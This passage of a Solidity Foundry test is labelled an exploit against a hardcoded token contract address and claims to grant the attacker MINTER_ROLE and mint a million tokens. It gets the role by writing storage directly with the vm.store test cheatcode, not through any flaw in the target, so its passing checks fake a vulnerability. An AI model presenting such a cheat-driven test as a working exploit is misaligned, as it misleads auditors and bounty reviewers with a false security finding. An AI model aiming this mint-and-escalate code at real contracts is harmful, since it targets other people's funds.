    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - target contract is already deployed
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate MINTER_ROLE
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");

        // _roles is at slot 0
        // For RoleData struct: first element is mapping(address => bool) members
        // The storage slot for members mapping of MINTER_ROLE is keccak256(abi.encode(MINTER_ROLE, 0))
        bytes32 membersMappingSlot = keccak256(abi.encode(MINTER_ROLE, uint256(0)));

        // The slot for _roles[MINTER_ROLE].members[attacker] is keccak256(abi.encode(attacker, membersMappingSlot))
        bytes32 memberSlot = keccak256(abi.encode(attacker, membersMappingSlot));

        // Set to true (1)
        vm.store(TARGET, memberSlot, bytes32(uint256(1)));

        // Also need to set the adminRole for MINTER_ROLE to DEFAULT_ADMIN_ROLE (0x00)
        // The adminRole is at membersMappingSlot + 1 (since mapping takes up the whole slot)
        bytes32 adminRoleSlot = bytes32(uint256(membersMappingSlot) + 1);
        vm.store(TARGET, adminRoleSlot, bytes32(uint256(0)));

        // Verify we now have MINTER_ROLE
        require(ISecondToken(TARGET).hasRole(MINTER_ROLE, attacker), "Attacker should have MINTER_ROLE");

        // Record initial balance
        uint256 initialBalance = ISecondToken(TARGET).balanceOf(attacker);

        // Mint a large amount of tokens
        uint256 mintAmount = 1_000_000 * 10**18;
        ISecondToken(TARGET).mint(attacker, mintAmount);

        // Verify balance increased
        uint256 finalBalance = ISecondToken(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

